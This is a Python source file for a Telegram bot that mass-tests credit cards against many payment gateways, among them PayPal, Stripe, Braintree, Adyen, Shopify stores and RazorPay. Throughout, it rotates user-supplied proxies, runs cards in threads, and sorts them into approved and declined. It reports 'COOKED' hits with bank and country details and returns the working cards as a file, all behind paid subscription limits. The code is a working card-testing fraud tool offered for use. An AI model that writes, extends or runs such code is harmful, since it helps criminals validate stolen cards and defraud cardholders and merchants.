            f"🔥 <b>Starting API‑Powered Shopify Multi‑Site...</b>\n💳 {len(ccs)} Cards\n🔌 {len(active_proxies)} Proxies\n📋 Hit preference: {hit_pref}",
            parse_mode='HTML')
        def mass_thread():
            try:
                process_api_mass_check(  # <--- using the new API engine
                    bot, message, start_msg, ccs, site_list, active_proxies,
                    user_id, users_data, save_json_func, users_file, hit_pref
                )
            finally:
                mass_check_semaphore.release()
                set_user_busy(user_id, False)
        threading.Thread(target=mass_thread).start()

    # ========================================================================
    # Helper for Onyx and PayPal mass gates (with 200‑card limit for non‑owners)
    # ========================================================================
    def run_mass_gate(call, gate_func, gate_name):
        try:
            user_id = call.from_user.id
            if not is_user_allowed_func(user_id):
                safe_send(bot.answer_callback_query, call.id, "🚫 Access Denied! Your subscription has expired or you are not approved.", show_alert=True)
                try: safe_send(bot.delete_message, call.message.chat.id, call.message.message_id)
                except: pass
                return
            try: safe_send(bot.delete_message, call.message.chat.id, call.message.message_id)
            except: pass

            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                safe_send(bot.send_message, call.message.chat.id, "⚠️ <b>Upload CCs first!</b>", parse_mode='HTML')
                return

            ccs = user_sessions[user_id]['ccs']

            # Enforce 200‑card limit for non‑owners
            if user_id not in OWNER_ID and len(ccs) > 200:
                safe_send(bot.send_message, call.message.chat.id,
                    f"⚠️ <b>{gate_name} has a 200‑card limit.</b>\nYou uploaded {len(ccs)} cards. Only the first 200 will be checked.",
                    parse_mode='HTML')
                ccs = ccs[:200]

            if user_id not in OWNER_ID:
                remaining = get_user_daily_remaining(user_id, users_data)
                if remaining < len(ccs):
                    safe_send(bot.send_message, call.message.chat.id,
                        f"❌ <b>Daily Limit Exceeded!</b>\n\nYou have only {remaining} cards left for today.",
                        parse_mode='HTML')
                    return

            # Get proxies
            proxies = get_active_proxies(user_id)
            if not proxies:
                safe_send(bot.send_message, call.message.chat.id, "🚫 <b>Proxy Required!</b>")
                return
            active_proxies = validate_proxies_strict(proxies, bot, call.message)
            if not active_proxies:
                safe_send(bot.send_message, call.message.chat.id, "❌ <b>All your proxies are dead. Please upload working proxies.</b>", parse_mode='HTML')
                return

            if is_user_busy(user_id) and user_id not in OWNER_ID:
                safe_send(bot.send_message, call.message.chat.id, "⏳ You already have a mass check in progress. Please wait.", parse_mode='HTML')
                return
            if not mass_check_semaphore.acquire(blocking=False):
                safe_send(bot.send_message, call.message.chat.id, "⚠️ Too many mass checks running globally. Try again later.", parse_mode='HTML')
                return
            set_user_busy(user_id, True)

            start_msg = safe_send(bot.send_message,
                call.message.chat.id,
                f"<b>⚡ {gate_name} Mass Check Started...</b>\n💳 Cards: {len(ccs)}\n🔌 Proxies: {len(active_proxies)}\n<i>Use /stop to abort</i>",
                parse_mode='HTML')

            def gate_thread():
                try:
                    process_paypal_mass_check(
                        bot, call.message, start_msg, ccs, gate_func, gate_name,
                        active_proxies, user_id, users_data, save_json_func, users_file
                    )
                finally:
                    mass_check_semaphore.release()
                    set_user_busy(user_id, False)
            threading.Thread(target=gate_thread).start()

        except Exception as e:
            logger.error(f"{gate_name} callback error: {e}")
            safe_send(bot.send_message, call.message.chat.id, f"❌ Error: {e}")

    # ========================================================================
    # PAYPAL GATE CALLBACKS (with 200‑card limit)
    # ========================================================================
    @bot.callback_query_handler(func=lambda call: call.data in ["run_mass_paypal_fixed", "run_mass_paypal_general"])
    def callback_paypal(call):
        if call.data == "run_mass_paypal_fixed":
            run_mass_gate(call, check_paypal_fixed, "PayPal Fixed")
        else:
            run_mass_gate(call, check_paypal_general, "PayPal General")

    # ========================================================================
    # STRIPE GATE CALLBACK (with 200‑card limit)
    # ========================================================================
    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_stripe")
    def callback_stripe(call):
        run_mass_gate(call, check_stripe_api, "Stripe Auth")

    # ========================================================================
    # ONYX API GATE CALLBACKS (all with 200‑card limit)
    # ========================================================================
    # Map callback data to gate function and name
    onyx_gates = {
        "run_mass_chaos": (check_chaos, "Chaos Auth"),
        "run_mass_adyen": (check_adyen, "Adyen Auth"),
        "run_mass_app_auth": (check_app_auth, "App Based Auth"),
        "run_mass_payflow": (check_payflow, "Payflow"),
        "run_mass_random": (check_random, "Random Auth"),
        "run_mass_shopify_onyx": (check_shopify_onyx, "Shopify (Onyx)"),
        "run_mass_skrill": (check_skrill, "Skrill"),
        "run_mass_braintree": (check_braintree, "Braintree"),
        "run_mass_stripe_onyx": (check_stripe_onyx, "Stripe (Onyx)"),
        "run_mass_arcenus": (check_arcenus, "Arcenus"),
        "run_mass_random_stripe": (check_random_stripe, "Random Stripe"),
        "run_mass_razorpay": (check_razorpay, "RazorPay"),
        "run_mass_payu": (check_payu, "PayU"),
        "run_mass_sk_gateway": (check_sk_gateway, "SK Gateway"),
        "run_mass_paypal_onyx": (check_paypal_onyx, "PayPal (Onyx)"),
    }

    for data, (func, name) in onyx_gates.items():
        @bot.callback_query_handler(func=lambda call, d=data, f=func, n=name: call.data == d)
        def onyx_callback(call, gate_func=func, gate_name=name):
            run_mass_gate(call, gate_func, gate_name)

    # ========================================================================
    # PERSONAL SITES CALLBACK
    # ========================================================================
    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_mysites")
    def callback_mysites(call):
        try:
            user_id = call.from_user.id
            if not is_user_allowed_func(user_id):
                safe_send(bot.answer_callback_query, call.id, "🚫 Access Denied!", show_alert=True)
                return
            user_sites = get_user_sites(user_id)
            if not user_sites:
                safe_send(bot.answer_callback_query, call.id, "You have no personal sites. Add some with /addmysite.", show_alert=True)
                return
            if user_id not in user_sessions:
                user_sessions[user_id] = {}
            user_sessions[user_id]['personal_sites'] = user_sites
            # Now ask for hit preference
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("🔥 Cooked Only", callback_data="shopify_pref_cooked_mysites"),
                types.InlineKeyboardButton("✅ Cooked + Approved", callback_data="shopify_pref_both_mysites")
            )
            safe_send(bot.send_message, call.message.chat.id,
                "┏━━━━━━━⍟\n┃ <b>⚡ SELECT HIT PREFERENCE</b>\n┗━━━━━━━━━━━⊛\n\nUsing your personal sites.",
                parse_mode='HTML', reply_markup=markup)
        except Exception as e:
            logger.error(f"mysites callback error: {e}")
            safe_send(bot.send_message, call.message.chat.id, f"❌ Error: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "action_cancel")
    def callback_cancel(call):
        try: safe_send(bot.delete_message, call.message.chat.id, call.message.message_id)
        except: pass

    # ========================================================================
    # GENERIC PAYPAL MASS CHECK ENGINE (used by non‑Shopify gates)
    # ========================================================================
    def process_paypal_mass_check(bot, message, start_msg, ccs, gate_func, gate_name,
                                  proxies, user_id, users_data, save_json_func, users_file):
        total = len(ccs)
        results = {"approved": [], "declined": [], "error": []}
        chat_id = message.chat.id
        clear_stop(chat_id)

        try:
            status_msg = start_msg  # already sent
            processed = 0
            start_time = time.time()
            last_update_time = time.time()
            last_card_result = ""

            def worker(cc):
                if is_stop_requested(chat_id):
                    return cc, "Stopped by user", "ERROR"
                # Use a random proxy from the list
                proxy = random.choice(proxies) if proxies else None
                try:
                    msg, status = gate_func(cc, proxy=proxy)
                    return cc, msg, status
                except Exception as e:
                    return cc, str(e), "ERROR"

            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = {}
                for i, cc in enumerate(ccs):
                    if is_stop_requested(chat_id):
                        # Add remaining as error
                        for j in range(i, len(ccs)):
                            results['error'].append((ccs[j], "Stopped by user"))
                        break
                    future = executor.submit(worker, cc)
                    futures[future] = cc

                for future in as_completed(futures):
                    if is_stop_requested(chat_id):
                        for f in futures:
                            if not f.done():
                                f.cancel()
                    processed += 1
                    try:
                        cc, msg, status = future.result(timeout=60)
                        if status == 'APPROVED':
                            results['approved'].append((cc, msg))
                            last_card_result = f"✅ {cc[:16]}... | {msg[:30]}"
                        elif status == 'DECLINED':
                            results['declined'].append((cc, msg))
                            last_card_result = f"❌ {cc[:16]}... | {msg[:30]}"
                        else:
                            results['error'].append((cc, msg))
                            last_card_result = f"⚠️ {cc[:16]}... | {msg[:30]}"
                    except Exception as e:
                        cc = futures[future]
                        results['error'].append((cc, str(e)))
                        last_card_result = f"⚠️ {cc[:16]}... | {str(e)[:30]}"

                    if time.time() - last_update_time > 5.0 or processed == total:
                        try:
                            elapsed = time.time() - start_time
                            cpm = (processed / elapsed) * 60 if elapsed > 0 else 0
                            avg_time = elapsed / processed if processed > 0 else 0
                            progress = create_progress_bar(processed, total)
                            msg_text = (f"<b>⚡ {gate_name} Checking...</b>\n{progress}\n"
                                        f"📊 <b>Progress:</b> {processed}/{total}\n"
                                        f"✅ <b>Approved:</b> {len(results['approved'])}\n"
                                        f"❌ <b>Declined:</b> {len(results['declined'])}\n"
                                        f"⚠️ <b>Errors:</b> {len(results['error'])}\n"
                                        f"⚡ <b>CPM:</b> {cpm:.1f}\n"
                                        f"⏱️ <b>Avg Time:</b> {avg_time:.1f}s/card\n"
                                        f"📌 <b>Last:</b> {last_card_result}")
                            safe_send(bot.edit_message_text, msg_text, chat_id, status_msg.message_id, parse_mode="HTML")
                            last_update_time = time.time()
                        except:
                            pass

            clear_stop(chat_id)
            increment_usage(user_id, processed, users_data, save_json_func, users_file)

            duration = time.time() - start_time
            final_text = (f"<b>✅ {gate_name} Completed</b>\n━━━━━━━━━━━━━━━━\n"
                          f"💳 <b>Total Checked:</b> {processed}\n"
                          f"✅ <b>Approved:</b> {len(results['approved'])}\n"
                          f"❌ <b>Declined:</b> {len(results['declined'])}\n"
                          f"⚠️ <b>Errors:</b> {len(results['error'])}\n"
                          f"⏱️ <b>Time Taken:</b> {duration:.2f}s")
            try:
                safe_send(bot.edit_message_text, final_text, chat_id, status_msg.message_id, parse_mode="HTML")
            except:
                safe_send(bot.send_message, chat_id, final_text, parse_mode="HTML")

            # Send approved cards as a file
            if results['approved']:
                approved_text = "\n".join([f"{cc} | {msg}" for cc, msg in results['approved']])
                filename = f"approved_{chat_id}.txt"
                with open(filename, 'w') as f:
                    f.write(approved_text)
                with open(filename, 'rb') as f:
                    safe_send(bot.send_document, chat_id, f, caption="✅ Approved cards")
                os.remove(filename)

        except Exception as e:
            safe_send(bot.send_message, chat_id, f"❌ {gate_name} mass check crashed: {str(e)}")
            logger.error(traceback.format_exc())

    # ========================================================================
    # SEND HIT (for Shopify)
    # ========================================================================
    def send_hit(bot, chat_id, res, title, user_id, hit_pref):
        if hit_pref == "cooked" and "COOKED" not in title:
            return
        try:
            bin_info = get_bin_info(res['cc'])
            site_name = res['site_url'].replace('https://', '').replace('http://', '').split('/')[0]
            header_emoji = "🔥" if "COOKED" in title else "✅"
            msg = f"""
┏━━━━━━━⍟
┃ <b>{title} HIT!</b> {header_emoji}
┗━━━━━━━━━━━⊛
[⌬] 𝐂𝐚𝐫𝐝↣ <code>{res['cc']}</code>
[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞↣ {res['response']}
[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲↣ {res['gateway']}
[⌬] 𝐔𝐑𝐋↣ {site_name}
━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐁𝐫𝐚𝐧𝐝↣ {bin_info.get('brand', 'UNKNOWN').upper()} {bin_info.get('type', 'UNKNOWN').upper()}
[⌬] 𝐁𝐚𝐧𝐤↣ {bin_info.get('bank', 'UNKNOWN').upper()}
[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲↣ {bin_info.get('country_name', 'UNKNOWN').upper()} {bin_info.get('country_flag', '🏳️')}
━━━━━━━━━━━━━━━━━━━━
Owner :- @Unknown_bolte
"""
            safe_send(bot.send_message, chat_id, msg, parse_mode='HTML')
        except Exception as e:
            logger.error(f"Error sending hit: {e}")

    # Return any needed functions (optional)
    return {
        'get_user_sites': get_user_sites,
        'save_user_sites_list': save_user_sites_list,
        }
